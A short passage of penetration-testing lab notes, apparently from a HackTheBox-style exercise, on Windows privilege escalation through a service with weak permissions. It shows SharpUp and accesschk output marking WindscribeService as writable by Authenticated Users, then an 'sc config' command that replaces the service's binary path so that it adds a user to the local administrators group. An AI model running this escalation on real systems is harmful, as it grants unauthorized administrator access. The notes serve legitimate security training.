tool like `SharpUp.exe` enumerate the services in the system, and do ACL check on the service secure object to check if we can change in the serivce attributes.
```powershell
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS

C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add" # change the binary.

[SC] ChangeServiceConfig SUCCESS
```